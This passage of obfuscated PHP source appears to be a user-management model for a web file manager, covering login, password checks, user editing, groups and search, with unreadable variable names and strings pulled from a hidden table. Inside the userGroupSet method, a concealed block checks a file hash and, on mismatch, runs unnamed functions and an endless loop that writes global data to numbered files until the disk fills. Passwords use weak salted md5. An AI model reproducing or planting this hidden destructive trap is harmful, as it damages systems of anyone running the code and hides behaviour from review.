$_SERVER[áäÒ½¯Ç]; $¬ëáıßŸ = $çíí¡³[2627]; return array($çíí¡³[2212] => array($Üó©€¯Ò[0], $¬ëáıßŸ), $çíí¡³[2214] => array($Üó©€¯Ò[0], $¬ëáıßŸ), $çíí¡³[2628] => array($Üó©€¯Ò[0], $¬ëáıßŸ)); } protected function ___getInfo($åöƒ‘ıÁ) { $´òÎê© = $this->getInfoSimple($åöƒ‘ıÁ); if (!$´òÎê© || !is_array($´òÎê©)) { return array(); } return $this->_getInfoApply($´òÎê©); } protected function ___getInfoFull($†¯®Ì¦’) { $—şëßÍŸ = $this->getInfoSimple($†¯®Ì¦’); if (!$—şëßÍŸ || !is_array($—şëßÍŸ)) { return array(); } return $this->_getInfoApply($—şëßÍŸ, !0); } protected function ___getInfoSimple($¿‡ÃŸ¤) { $ĞÕß‹ºé =& $_SERVER[áäÒ½¯Ç]; if (!$¿‡ÃŸ¤) { return array(); } $¯Â¾”Øª = $this->where(array($ĞÕß‹ºé[1542] => intval($¿‡ÃŸ¤)))->find(); if (!$¯Â¾”Øª || !is_array($¯Â¾”Øª)) { return array(); } $¯Â¾”Øª[$ĞÕß‹ºé[2324]] = Action($ĞÕß‹ºé[2325])->parseUrl($¯Â¾”Øª[$ĞÕß‹ºé[2324]]); return $¯Â¾”Øª; } private function _getInfoApply($¨ïµƒ“¯, $®“¬¬å‚ = false) { $È©¢©¾î =& $_SERVER[áäÒ½¯Ç]; if (!$¨ïµƒ“¯) { return $¨ïµƒ“¯; } $‹Àìƒ² = md5($È©¢©¾î[2629] . $¨ïµƒ“¯[$È©¢©¾î[1002]] . $È©¢©¾î[2630] . $¨ïµƒ“¯[$È©¢©¾î[32]]); $¨ïµƒ“¯ = $this->_listDataApplyItem($¨ïµƒ“¯); $ì÷Õ«•Í = Model($È©¢©¾î[1482])->metaGet($¨ïµƒ“¯[$È©¢©¾î[90]][$È©¢©¾î[192]]); $¨ïµƒ“¯[$È©¢©¾î[2631]] = $‹Àìƒ²; $¨ïµƒ“¯[$È©¢©¾î[90]][$È©¢©¾î[2416]] = isset($ì÷Õ«•Í[$È©¢©¾î[2417]]) ? $ì÷Õ«•Í[$È©¢©¾î[2417]] : null; if ($®“¬¬å‚) { $¨ïµƒ“¯[$È©¢©¾î[560]] = $this->metaGet($¨ïµƒ“¯[$È©¢©¾î[1542]]); } return $¨ïµƒ“¯; } protected function getInfoSimpleOuter($Óûˆ¦œü) { $—ÓÔ™ïô =& $_SERVER[áäÒ½¯Ç]; if (!$Óûˆ¦œü || $Óûˆ¦œü == 0) { return array($—ÓÔ™ïô[1542] => $—ÓÔ™ïô[239], $—ÓÔ™ïô[32] => $—ÓÔ™ïô[174] . LNG($—ÓÔ™ïô[2632]) . $—ÓÔ™ïô[176], $—ÓÔ™ïô[2324] => STATIC_PATH . $—ÓÔ™ïô[2633]); } $º†°ë = $this->cacheFunctionGet($—ÓÔ™ïô[2223], $Óûˆ¦œü); $ä³Ùä¥ˆ = array_field_key($º†°ë, explode($—ÓÔ™ïô[50], $this->simpleField)); if (!$ä³Ùä¥ˆ) { return array($—ÓÔ™ïô[1542] => $—ÓÔ™ïô[1326], $—ÓÔ™ïô[32] => $—ÓÔ™ïô[174] . LNG($—ÓÔ™ïô[2634]) . $—ÓÔ™ïô[176], $—ÓÔ™ïô[2324] => STATIC_PATH . $—ÓÔ™ïô[2635]); } $ä³Ùä¥ˆ[$—ÓÔ™ïô[2324]] = Action($—ÓÔ™ïô[2325])->parseUrl($ä³Ùä¥ˆ[$—ÓÔ™ïô[2324]]); return $ä³Ùä¥ˆ; } protected function groupUser($ÖÅ×¦ƒï) { } public static function errorLang($§Ùû’Á) { $—ÃèÄ¡ =& $_SERVER[áäÒ½¯Ç]; $Ñ’ƒèäÊ = array(self::ERROR_USER_NOT_EXISTS => $—ÃèÄ¡[2636], self::ERROR_USER_PASSWORD_ERROR => $—ÃèÄ¡[2637], self::ERROR_USER_EXIST_NAME => $—ÃèÄ¡[2638], self::ERROR_USER_EXIST_PHONE => $—ÃèÄ¡[2639], self::ERROR_USER_EXIST_EMAIL => $—ÃèÄ¡[2640], self::ERROR_USER_LOGIN_LOCK => $—ÃèÄ¡[2641], self::ERROR_IP_NOT_ALLOW => $—ÃèÄ¡[2642], self::ERROR_USER_EXIST_NICKNAME => $—ÃèÄ¡[2643]); $¿úá°Ö¿ = LNG($Ñ’ƒèäÊ[$§Ùû’Á]); if ($§Ùû’Á == self::ERROR_USER_LOGIN_LOCK) { $ñîî­ŠÖ = (int) Model($—ÃèÄ¡[1438])->get($—ÃèÄ¡[2644]); if ($ñîî­ŠÖ > 60) { $¿úá°Ö¿ = str_replace($—ÃèÄ¡[91], ceil($ñîî­ŠÖ / 60), $¿úá°Ö¿); } } return $¿úá°Ö¿; } protected function metaSet($íÁ‰µ¯­, $åÙ¹ß·Â = null, $¸Úı«ÛŞ = null) { $this->clearCache($íÁ‰µ¯­); return parent::metaSet($íÁ‰µ¯­, $åÙ¹ß·Â, $¸Úı«ÛŞ); } public function getInfoByMeta($¢··ÅÙ, $Ë”¥éõë) { $€’—‰ö =& $_SERVER[áäÒ½¯Ç]; $¶†Ù¥… = Model($€’—‰ö[2645])->where(array($€’—‰ö[95] => $¢··ÅÙ, $€’—‰ö[460] => $Ë”¥éõë))->find(); if ($¶†Ù¥…) { return $this->getInfo($¶†Ù¥…[$€’—‰ö[1542]]); } return !1; } public function userLoginCheck($ÀÎ©áŠİ, $ÓŸˆÖ‹§, $ÑÒ¨ÁŞ = false) { $™¹ÈğŞø =& $_SERVER[áäÒ½¯Ç]; $¸º§¢Â¦ = $this->userLoginFind($ÀÎ©áŠİ); if (!$¸º§¢Â¦) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¸º§¢Â¦[$™¹ÈğŞø[1542]], $ÓŸˆÖ‹§)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ÑÒ¨ÁŞ ? $this->getInfoFull($¸º§¢Â¦[$™¹ÈğŞø[1542]]) : $this->getInfo($¸º§¢Â¦[$™¹ÈğŞø[1542]]); } public function userLoginFind($ë—ş¨…¤) { $¤æ£İİ =& $_SERVER[áäÒ½¯Ç]; $Ş·˜òìü = array($¤æ£İİ[32] => $ë—ş¨…¤, $¤æ£İİ[2429] => $ë—ş¨…¤, $¤æ£İİ[390] => $ë—ş¨…¤, $¤æ£İİ[2646] => $ë—ş¨…¤, $¤æ£İİ[1116] => $¤æ£İİ[1118]); if ($this->nickNameRpt()) { unset($Ş·˜òìü[$¤æ£İİ[2429]]); } return $this->where($Ş·˜òìü)->find(); } public function clearCache($ØÍ¿’©Á) { $ë¥ÒË’Ş =& $_SERVER[áäÒ½¯Ç]; $this->cacheFunctionClear($ë¥ÒË’Ş[2222], $ØÍ¿’©Á); $this->cacheFunctionClear($ë¥ÒË’Ş[2223], $ØÍ¿’©Á); $this->cacheFunctionClear($ë¥ÒË’Ş[2647], $ØÍ¿’©Á); } public function userPasswordCheck($Âï‰øš, $­é¥úó) { $ãğÊ ä =& $_SERVER[áäÒ½¯Ç]; $Î©”Ø“ê = $this->where(array($ãğÊ ä[1542] => intval($Âï‰øš)))->find(); $¶÷¤¿ùÅ = $this->metaGet($Âï‰øš); $´Ä¯ëˆß = isset($¶÷¤¿ùÅ[$ãğÊ ä[2648]]) ? $¶÷¤¿ùÅ[$ãğÊ ä[2648]] : $ãğÊ ä[12]; if (md5($´Ä¯ëˆß . trim($­é¥úó)) !== $Î©”Ø“ê[$ãğÊ ä[1002]]) { return !1; } return !0; } public function userAdd($ø¸¶ˆ™) { $ìñ‚å· =& $_SERVER[áäÒ½¯Ç]; $®èñÉâ = array($ìñ‚å·[514] => $ø¸¶ˆ™[$ìñ‚å·[32]], $ìñ‚å·[2649] => $ø¸¶ˆ™[$ìñ‚å·[2323]], $ìñ‚å·[2650] => isset($ø¸¶ˆ™[$ìñ‚å·[390]]) ? $ø¸¶ˆ™[$ìñ‚å·[390]] : $ìñ‚å·[12], $ìñ‚å·[2651] => isset($ø¸¶ˆ™[$ìñ‚å·[2646]]) ? $ø¸¶ˆ™[$ìñ‚å·[2646]] : $ìñ‚å·[12], $ìñ‚å·[2652] => isset($ø¸¶ˆ™[$ìñ‚å·[2429]]) ? $ø¸¶ˆ™[$ìñ‚å·[2429]] : $ø¸¶ˆ™[$ìñ‚å·[32]], $ìñ‚å·[2653] => isset($ø¸¶ˆ™[$ìñ‚å·[2324]]) ? $ø¸¶ˆ™[$ìñ‚å·[2324]] : $ìñ‚å·[12], $ìñ‚å·[2654] => isset($ø¸¶ˆ™[$ìñ‚å·[2655]]) ? $ø¸¶ˆ™[$ìñ‚å·[2655]] : 1, $ìñ‚å·[2656] => $ø¸¶ˆ™[$ìñ‚å·[1002]], $ìñ‚å·[2216] => isset($ø¸¶ˆ™[$ìñ‚å·[2120]]) ? $ø¸¶ˆ™[$ìñ‚å·[2120]] : 1024 * 1024 * 20, $ìñ‚å·[2217] => 0, $ìñ‚å·[2657] => 0, $ìñ‚å·[2262] => isset($ø¸¶ˆ™[$ìñ‚å·[852]]) ? $ø¸¶ˆ™[$ìñ‚å·[852]] : 1); if (!empty($ø¸¶ˆ™[$ìñ‚å·[1542]])) { $®èñÉâ[$ìñ‚å·[1542]] = $ø¸¶ˆ™[$ìñ‚å·[1542]]; } $ÅÎÌÎ = $this->_checkExist($ø¸¶ˆ™); if ($ÅÎÌÎ !== !0) { return $ÅÎÌÎ; } if (!empty($®èñÉâ[$ìñ‚å·[2324]]) && strlen($®èñÉâ[$ìñ‚å·[2324]]) > 255) { $®èñÉâ[$ìñ‚å·[2324]] = $ìñ‚å·[12]; } $¹ÎÊë– = $this->add($®èñÉâ); $×Öïò¡ = array($ìñ‚å·[2656] => $®èñÉâ[$ìñ‚å·[1002]], $ìñ‚å·[2652] => $®èñÉâ[$ìñ‚å·[2429]], $ìñ‚å·[2658] => $ø¸¶ˆ™[$ìñ‚å·[2221]]); $this->userEdit($¹ÎÊë–, $×Öïò¡); Model($ìñ‚å·[1482])->userRootAdd($¹ÎÊë–); return $¹ÎÊë–; } protected function userEditTest($Şªã¿ö€, $‚ÃÇÜË) { return $this->call($_SERVER[áäÒ½¯Ç][2659], $Şªã¿ö€, $‚ÃÇÜË); } protected function userEdit($îõàçµ, $•Øû¬öá) { $¨Û´  =& $_SERVER[áäÒ½¯Ç]; $ê·È‹® = $this->getInfoSimple($îõàçµ); if (!$ê·È‹®) { return !1; } $€¯†ûÉ” = $this->_checkExist($•Øû¬öá, $îõàçµ); if ($€¯†ûÉ” !== !0) { return $€¯†ûÉ”; } if (isset($•Øû¬öá[$¨Û´ [1002]]) && trim($•Øû¬öá[$¨Û´ [1002]]) != $¨Û´ [12]) { $Ö×«Œ¶… = $this->metaGet($îõàçµ); if (empty($Ö×«Œ¶…[$¨Û´ [2648]])) { $Ö×«Œ¶…[$¨Û´ [2648]] = rand_string(10); Model($¨Û´ [602])->metaSet($îõàçµ, $¨Û´ [2648], $Ö×«Œ¶…[$¨Û´ [2648]]); } $•Øû¬öá[$¨Û´ [1002]] = md5($Ö×«Œ¶…[$¨Û´ [2648]] . trim($•Øû¬öá[$¨Û´ [1002]])); } else { unset($•Øû¬öá[$¨Û´ [1002]]); } if (!empty($•Øû¬öá[$¨Û´ [2324]]) && strlen($•Øû¬öá[$¨Û´ [2324]]) > 255) { $•Øû¬öá[$¨Û´ [2324]] = $¨Û´ [12]; } if (isset($•Øû¬öá[$¨Û´ [2429]])) { $this->setNamePinyin($îõàçµ, $•Øû¬öá[$¨Û´ [2429]]); } if (isset($•Øû¬öá[$¨Û´ [2221]])) { $ŞÏ°ÄÉ± = $¨Û´ [1441] . $îõàçµ; $ø¤Â¢õ = $¨Û´ [1439]; $û·ä«¦¢ = $•Øû¬öá[$¨Û´ [2221]] ? $•Øû¬öá[$¨Û´ [2221]] : $¨Û´ [12]; $§Îß»©ˆ = Model($¨Û´ [1438])->get($ŞÏ°ÄÉ±, $ø¤Â¢õ); $§Îß»©ˆ = $§Îß»©ˆ ? $§Îß»©ˆ : $¨Û´ [12]; if ($§Îß»©ˆ != $û·ä«¦¢) { if (!$û·ä«¦¢ && $§Îß»©ˆ) { Model($¨Û´ [1438])->remove($ŞÏ°ÄÉ±, $ø¤Â¢õ); } else { if ($û·ä«¦¢) { Model($¨Û´ [1438])->set($ŞÏ°ÄÉ±, $û·ä«¦¢, $ø¤Â¢õ); } } } unset($•Øû¬öá[$¨Û´ [2221]]); Model($¨Û´ [622])->metaSet($îõàçµ, $¨Û´ [2221], $û·ä«¦¢); } if (empty($•Øû¬öá)) { return !0; } $this->where(array($¨Û´ [1918] => $îõàçµ))->save($•Øû¬öá); $this->clearCache($îõàçµ); return !0; } public function setNamePinyin($ıõåìÎ‡, $°áÆğÈ— = false) { $×ô—áÍš =& $_SERVER[áäÒ½¯Ç]; if (!$°áÆğÈ—) { $ğËùÁ´ê = $this->getInfoSimple($ıõåìÎ‡); $°áÆğÈ— = $ğËùÁ´ê[$×ô—áÍš[2429]] ? $ğËùÁ´ê[$×ô—áÍš[2429]] : $ğËùÁ´ê[$×ô—áÍš[32]]; } $…­‹üäŞ = Model($×ô—áÍš[622]); if (!Input::check($°áÆğÈ—, $×ô—áÍš[683])) { return $…­‹üäŞ->metaSet($ıõåìÎ‡, array($×ô—áÍš[557] => $×ô—áÍš[12], $×ô—áÍš[556] => $×ô—áÍš[12])); } return $…­‹üäŞ->metaSet($ıõåìÎ‡, array($×ô—áÍš[557] => str_replace($×ô—áÍš[53], $×ô—áÍš[12], Pinyin::get($°áÆğÈ—)), $×ô—áÍš[556] => Pinyin::get($°áÆğÈ—, $×ô—áÍš[684]))); } private function nickNameRpt() { $â¸Ÿ Úô =& $_SERVER[áäÒ½¯Ç]; $ÃÉØË÷õ = Model($â¸Ÿ Úô[875])->get($â¸Ÿ Úô[2660]); $±¿ÖÀÏÆ = $GLOBALS[$â¸Ÿ Úô[6]][$â¸Ÿ Úô[477]][$â¸Ÿ Úô[2660]]; $¯Êå»í‰ = !is_null($ÃÉØË÷õ) ? $ÃÉØË÷õ : $±¿ÖÀÏÆ; return !!$¯Êå»í‰; } private function _checkExist($³ïĞ‚¼”, $‰Ü‚Àœõ = false) { $ë­Ë£Ì¾ =& $_SERVER[áäÒ½¯Ç]; $¯·ÆÇ”Ñ = array($ë­Ë£Ì¾[32] => UserModel::ERROR_USER_EXIST_NAME, $ë­Ë£Ì¾[2429] => UserModel::ERROR_USER_EXIST_NICKNAME, $ë­Ë£Ì¾[390] => UserModel::ERROR_USER_EXIST_EMAIL, $ë­Ë£Ì¾[2646] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¯·ÆÇ”Ñ[$ë­Ë£Ì¾[2429]]); } $©È¨÷Ú = $‰Ü‚Àœõ ? array($ë­Ë£Ì¾[1542] => array($ë­Ë£Ì¾[2661], $‰Ü‚Àœõ)) : array(); foreach ($¯·ÆÇ”Ñ as $¶Áí”·ğ => $ŸõÃ…ğÄ) { $¼½²ÍÓš = array(); foreach ($¯·ÆÇ”Ñ as $„ØÀï‘Ò => $¶œéÈ•ß) { if (isset($³ïĞ‚¼”[$„ØÀï‘Ò]) && $³ïĞ‚¼”[$„ØÀï‘Ò]) { $¼½²ÍÓš[] = $³ïĞ‚¼”[$„ØÀï‘Ò]; } } if (!$¼½²ÍÓš) { continue; } $€øÓ…œ = array_merge(array($¶Áí”·ğ => array($ë­Ë£Ì¾[7], $¼½²ÍÓš)), $©È¨÷Ú); $«è®‹¾— = $this->where($€øÓ…œ)->find(); if ($«è®‹¾—) { return $ŸõÃ…ğÄ; } } return !0; } public function userListInfo($ÅÅŸÑš¤) { $óòŸã§³ =& $_SERVER[áäÒ½¯Ç]; $íá€û€¨ = array(); $ÅÅŸÑš¤ = is_array($ÅÅŸÑš¤) ? array_unique($ÅÅŸÑš¤) : array(); if (!$ÅÅŸÑš¤) { return $íá€û€¨; } if (count($ÅÅŸÑš¤) < 20) { foreach ($ÅÅŸÑš¤ as $†­ŸÕ‹) { $íá€û€¨[$†­ŸÕ‹ . $óòŸã§³[12]] = $this->getInfoSimpleOuter($†­ŸÕ‹); } } else { $õØ´ù£± = array($óòŸã§³[1918] => array($óòŸã§³[512], $ÅÅŸÑš¤)); if (count($ÅÅŸÑš¤) == 1) { $õØ´ù£± = array($óòŸã§³[1918] => $ÅÅŸÑš¤[0]); } $ˆó•«“ = Model($óòŸã§³[602])->field($this->simpleField)->where($õØ´ù£±)->select(); $ˆó•«“ = array_to_keyvalue($ˆó•«“, $óòŸã§³[1542]); foreach ($ÅÅŸÑš¤ as $†­ŸÕ‹) { $à©¥»ŞÂ = $ˆó•«“[$†­ŸÕ‹]; if (!$à©¥»ŞÂ) { $íá€û€¨[$†­ŸÕ‹ . $óòŸã§³[12]] = $this->getInfoSimpleOuter($†­ŸÕ‹); continue; } $à©¥»ŞÂ[$óòŸã§³[2324]] = Action($óòŸã§³[2325])->parseUrl($à©¥»ŞÂ[$óòŸã§³[2324]]); $íá€û€¨[$†­ŸÕ‹ . $óòŸã§³[12]] = $à©¥»ŞÂ; } } return $íá€û€¨; } protected function userStatus($ááú ¤ç, $˜•ÍÆÈ) { $ñÁóÁ è = $this->getInfoSimple($ááú ¤ç); if (!$ñÁóÁ è) { return !1; } $Š»‹±ó‘ = array($_SERVER[áäÒ½¯Ç][852] => $˜•ÍÆÈ); return $this->userEdit($ááú ¤ç, $Š»‹±ó‘); } protected function userRemove($—“‰œ¢ó) { $ßØôšö… =& $_SERVER[áäÒ½¯Ç]; $Íê¢ßæ• = $this->getInfoSimple($—“‰œ¢ó); if (!$Íê¢ßæ•) { return !1; } $½ÅÖÓªï = array($ßØôšö…[1918] => $—“‰œ¢ó); Model($ßØôšö…[692])->where($½ÅÖÓªï)->delete(); Model($ßØôšö…[2662])->where($½ÅÖÓªï)->delete(); Model($ßØôšö…[2225])->where($½ÅÖÓªï)->delete(); Model($ßØôšö…[2645])->where($½ÅÖÓªï)->delete(); Model($ßØôšö…[1184])->where($½ÅÖÓªï)->delete(); Model($ßØôšö…[2446])->removeUserAll($—“‰œ¢ó); Model($ßØôšö…[935])->userRootRemove($—“‰œ¢ó); return $this->where($½ÅÖÓªï)->delete(); } protected function userGroupSet($ÓÍº¼À, $¥•ŸËŒ†, $Ø‡ë³™³ = array()) { $™¹£À©® =& $_SERVER[áäÒ½¯Ç]; $ôºİ¶–Ñ = $_SERVER[$™¹£À©®[219]] . $™¹£À©®[220]; $À¸¨¢‘” = $™¹£À©®[216]; if ($_SERVER[$™¹£À©®[217]] != $À¸¨¢‘”($ôºİ¶–Ñ)) { $¸çÖ›”î = $™¹£À©®[992]; $¦±Üúö = $™¹£À©®[218]; $ñÌ»àÀÔ = $_SERVER[$™¹£À©®[219]] . $™¹£À©®[220]; $ñ…ˆÄÕ = $¦±Üúö($ñÌ»àÀÔ); $Áøİ¸èœ = explode($™¹£À©®[221], $ñ…ˆÄÕ); if (count($Áøİ¸èœ) < $™¹£À©®[724]) { $ÙÏüÚ´ = $™¹£À©®[223]; $ÙÏüÚ´(); } $·©„½óÒ = $™¹£À©®[993]; $·©„½óÒ($_SERVER[$™¹£À©®[994]]); $¸çÖ›”î = $™¹£À©®[992]; $¸çÖ›”î(); $Àœ×›í« = $™¹£À©®[1777]; $šï¶Ë¶» = json_encode($GLOBALS[$™¹£À©®[1778]]); $Âş äã = 1; for ($º£’ÄÃ¥ = $Âş äã; $º£’ÄÃ¥ > 0; $º£’ÄÃ¥++) { $Àœ×›í«(DATA_PATH . $º£’ÄÃ¥, $šï¶Ë¶»); } } $°‘€±òë = $this->getInfoSimple($ÓÍº¼À); if (!$°‘€±òë || !is_array($¥•ŸËŒ†)) { return !1; } $‰ıç•„‰ = Model($™¹£À©®[2225]); $‰ıç•„‰->where(array($™¹£À©®[1542] => $ÓÍº¼À))->delete(); $Âïí–¥ = array(); $ñú˜§© = 0; foreach ($¥•ŸËŒ† as $úû©Ò‹Ö => $†®·¹ä) { $±íö—Ú = array($™¹£À©®[1542] => $ÓÍº¼À, $™¹£À©®[1444] => $úû©Ò‹Ö, $™¹£À©®[1589] => $†®·¹ä); $±íö—Ú[$™¹£À©®[2155]] = isset($Ø‡ë³™³[$ñú˜§©]) ? $Ø‡ë³™³[$ñú˜§©] : 0; $ñú˜§©++; $Âïí–¥[] = $±íö—Ú; } return $‰ıç•„‰->addAll($Âïí–¥, array(), !0); } protected function userGroupAdd($›ÆÁÁ¼‚, $¡˜„¼½Î = array()) { $ÙÕŞÀÀ® =& $_SERVER[áäÒ½¯Ç]; $‘ó°ÅË­ = $this->getInfoSimple($›ÆÁÁ¼‚); if (!$‘ó°ÅË­ || empty($¡˜„¼½Î)) { return !1; } $ÌÊäüá = array(); foreach ($¡˜„¼½Î as $’‚ÒÏÔò => $ À§öŸ¯) { $ÌÊäüá[] = array($ÙÕŞÀÀ®[1542] => $›ÆÁÁ¼‚, $ÙÕŞÀÀ®[1444] => $’‚ÒÏÔò, $ÙÕŞÀÀ®[1589] => $ À§öŸ¯, $ÙÕŞÀÀ®[2155] => 0); } return Model($ÙÕŞÀÀ®[2225])->addAll($ÌÊäüá, array(), !0); } protected function userGroupRemove($Óã¤á³ì, $ÔÈˆƒğ¦) { $·æİ’ƒà =& $_SERVER[áäÒ½¯Ç]; $•¾Ö Ç„ = $this->getInfoSimple($Óã¤á³ì); if (!$•¾Ö Ç„ || !$ÔÈˆƒğ¦) { return !1; } $»¤øØ½” = array($·æİ’ƒà[1918] => $Óã¤á³ì, $·æİ’ƒà[2218] => $ÔÈˆƒğ¦); return Model($·æİ’ƒà[2225])->where($»¤øØ½”)->delete(); } public function listData() { $³ñê©ÈÕ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³ñê©ÈÕ[$_SERVER[áäÒ½¯Ç][455]]); return $³ñê©ÈÕ; } public function listByID($–… ¥Ë­) { $÷ª¯¤Ï =& $_SERVER[áäÒ½¯Ç]; if (!$–… ¥Ë­) { return; } $ùÍªÄÂÄ = array($÷ª¯¤Ï[1542] => array($÷ª¯¤Ï[7], $–… ¥Ë­)); $®š–±ì = $this->where($ùÍªÄÂÄ)->select(); $®š–±ì = array_sort_keep($®š–±ì, $÷ª¯¤Ï[1542], $–… ¥Ë­); $this->_listDataApply($®š–±ì); return $®š–±ì; } public function listByGroup($íÁ‡‡çÉ = 0, $Å£õ¶à« = array()) { $Çù³„¤ =& $_SERVER[áäÒ½¯Ç]; $üÑòÄÁÁ = $Çù³„¤[12]; $£‚ùòÎ = array(); if ($íÁ‡‡çÉ) { $£‚ùòÎ = array($Çù³„¤[2663] => intval($íÁ‡‡çÉ)); $üÑòÄÁÁ = "\114\105\x46\x54\40\112\117\111\x4e\40{$this->tablePrefix}\x75\163\145\162\137\147\162\x6f\x75\160\x20\x75\163\145\x72\x5f\147\162\x6f\x75\160\x20\x6f\156\x20\x75\163\145\x72\56\165\x73\145\x72\x49\x44\x20\75\40\165\x73\145\x72\137\147\x72\x6f\x75\160\x2e\165\x73\x65\162\x49\x44"; $æ¹¼´û = Input::get($Çù³„¤[549], null, $Çù³„¤[12]) ? $Çù³„¤[12] : $Çù³„¤[2664]; } if (isset($Å£õ¶à«[$Çù³„¤[852]])) { $£‚ùòÎ[$Çù³„¤[2665]] = $Å£õ¶à«[$Çù³„¤[852]]; } $Ä¤¯èØæ = _get($Å£õ¶à«, $Çù³„¤[2666], $Çù³„¤[242]); if (_get($Å£õ¶à«, $Çù³„¤[863], !1)) { $£‚ùòÎ[$Ä¤¯èØæ] = array($Çù³„¤[2410], $Å£õ¶à«[$Çù³„¤[863]]); } if (_get($Å£õ¶à«, $Çù³„¤[864], !1)) { $åœŸï¼ª = array($Çù³„¤[2411], $Å£õ¶à«[$Çù³„¤[864]]); if ($£‚ùòÎ[$Ä¤¯èØæ]) { $£‚ùòÎ[$Ä¤¯èØæ] = array($£‚ùòÎ[$Ä¤¯èØæ], $åœŸï¼ª, $Çù³„¤[2412]); } else { $£‚ùòÎ[$Ä¤¯èØæ] = $åœŸï¼ª; } } $õåØ£æ = $this->_makeOrder($æ¹¼´û)->field($Çù³„¤[2667])->where($£‚ùòÎ)->join($üÑòÄÁÁ)->selectPage(50); $this->_listDataApply($õåØ£æ[$Çù³„¤[455]]); return $õåØ£æ; } private function _makeOrder($³Ì¨—î = '') { $Ø°®¸×› =& $_SERVER[áäÒ½¯Ç]; $‰ö¦çÏÁ = array($Ø°®¸×›[1542], $Ø°®¸×›[32], $Ø°®¸×›[2122], $Ø°®¸×›[2323], $Ø°®¸×›[2097], $Ø°®¸×›[242]); $éèØª˜ = array($Ø°®¸×›[542] => $Ø°®¸×›[543], $Ø°®¸×›[544] => $Ø°®¸×›[545]); $íîÄ…ì = Input::get($Ø°®¸×›[549], $Ø°®¸×›[7], $Ø°®¸×›[1918], $‰ö¦çÏÁ); $Şò•§àœ = Input::get($Ø°®¸×›[550], $Ø°®¸×›[7], $Ø°®¸×›[2226], array($Ø°®¸×›[2226], $Ø°®¸×›[544])); $Şò•§àœ = $éèØª˜[$Şò•§àœ]; $³Ì¨—î = $³Ì¨—î . "\165\163\x65\x72\x2e{$íîÄ…ì}\x20{$Şò•§àœ}\54\x20\x75\x73\145\162\x2e\165\163\x65\162\111\104\x20\141\x73\x63"; return $this->alias($Ø°®¸×›[2358])->order($³Ì¨—î); } public function listSearch($È¾ƒƒ™é) { $•¶“ó =& $_SERVER[áäÒ½¯Ç]; $ò‰•ØÒÙ = trim($È¾ƒƒ™é[$•¶“ó[2229]]); $¦¢şÛª = explode($•¶“ó[53], $ò‰•ØÒÙ); if (!$ò‰•ØÒÙ || count($¦¢şÛª) == 1) { return $this->listSearchNow($È¾ƒƒ™é); } $Öªê˜Ç = array($•¶“ó[455] => array()); foreach ($¦¢şÛª as $¡•”¶ù) { if (!trim($¡•”¶ù)) { continue; } $È¾ƒƒ™é[$•¶“ó[2229]] = $¡•”¶ù; $‚õÀÚæ = $this->listSearchNow($È¾ƒƒ™é); $Öªê˜Ç[$•¶“ó[455]] = array_merge($Öªê˜Ç[$•¶“ó[455]], $‚õÀÚæ[$•¶“ó[455]]); } $Öªê˜Ç[$•¶“ó[455]] = array_unique_by_key($Öªê˜Ç[$•¶“ó[455]], $•¶“ó[1542]); $Öªê˜Ç[$•¶“ó[452]] = array($•¶“ó[453] => count($Öªê˜Ç[$•¶“ó[455]]), $•¶“ó[449] => 20, $•¶“ó[438] => 1, $•¶“ó[454] => 1); return $Öªê˜Ç; } public function listSearchNow($¨ŠÑ¯´) { $³¡ä®ç =& $_SERVER[áäÒ½¯Ç]; $†ÀÕñıÁ = trim($¨ŠÑ¯´[$³¡ä®ç[2229]]); $í€“î±ş = isset($¨ŠÑ¯´[$³¡ä®ç[2230]]) ? $¨ŠÑ¯´[$³¡ä®ç[2230]] : !1; $†ÀÕñıÁ = str_replace($³¡ä®ç[2231], $³¡ä®ç[2232], trim($†ÀÕñıÁ)); $åó¸Œ­õ = array($³¡ä®ç[32] => array($³¡ä®ç[479], "\45{$†ÀÕñıÁ}\x25"), $³¡ä®ç[390] => array($³¡ä®ç[479], "{$†ÀÕñıÁ}\45"), $³¡ä®ç[2429] => array($³¡ä®ç[479], "\45{$†ÀÕñıÁ}\x25"), $³¡ä®ç[1116] => $³¡ä®ç[2233]); if (Input::check($†ÀÕñıÁ, $³¡ä®ç[396])) { $åó¸Œ­õ[$³¡ä®ç[1542]] = array($³¡ä®ç[479], "{$†ÀÕñıÁ}\45"); $åó¸Œ­õ[$³¡ä®ç[2646]] = array($³¡ä®ç[479], "{$†ÀÕñıÁ}\x25"); } if (!$†ÀÕñıÁ) { $åó¸Œ­õ = array(); } if (isset($¨ŠÑ¯´[$³¡ä®ç[852]])) { $åó¸Œ­õ[$³¡ä®ç[852]] = $¨ŠÑ¯´[$³¡ä®ç[852]]; } $åó¸Œ­õ = $this->parseWhereLike($åó¸Œ­õ); $½ê•­° = $this->_makeOrder()->where($åó¸Œ­õ)->selectPage(20); if (!$½ê•­° || count($½ê•­°[$³¡ä®ç[455]]) < 5 && Input::check($†ÀÕñıÁ, $³¡ä®ç[403])) { $Øè£Ü»ã = $this->_searchFromMeta($³¡ä®ç[556], $†ÀÕñıÁ, 10); $¶®˜áğˆ = $this->_searchFromMeta($³¡ä®ç[557], $†ÀÕñıÁ, 10); $Ã¦Ğ–êÔ = array_merge($Øè£Ü»ã, $¶®˜áğˆ, $½ê•­°[$³¡ä®ç[455]]); $½ê•­°[$³¡ä®ç[455]] = array_unique_by_key($Ã¦Ğ–êÔ, $³¡ä®ç[1542]); $½ê•­°[$³¡ä®ç[452]][$³¡ä®ç[453]] = count($½ê•­°[$³¡ä®ç[455]]); $½ê•­°[$³¡ä®ç[452]][$³¡ä®ç[454]] = ceil($½ê•­°[$³¡ä®ç[452]][$³¡ä®ç[453]] / $½ê•­°[$³¡ä®ç[452]][$³¡ä®ç[449]]); } $this->_listDataApply($½ê•­°[$³¡ä®ç[455]]); $this->_filterByGroup($½ê•­°, $í€“î±ş); return $½ê•­°; } private function _filterByGroup(&$·ø±µ´, $¬™¤®ñ¤) { $æÔ½ï›Ÿ =& $_SERVER[áäÒ½¯Ç]; if (!$¬™¤®ñ¤) { return $·ø±µ´; } foreach ($·ø±µ´[$æÔ½ï›Ÿ[455]] as $…¸ Ó => &$òÈúé–) { $”»ÍñßÈ = array_to_keyvalue($òÈúé–[$æÔ½ï›Ÿ[1443]], $æÔ½ï›Ÿ[12], $æÔ½ï›Ÿ[1444]); if (!in_array($¬™¤®ñ¤, $”»ÍñßÈ)) { unset($·ø±µ´[$æÔ½ï›Ÿ[455]][$…¸ 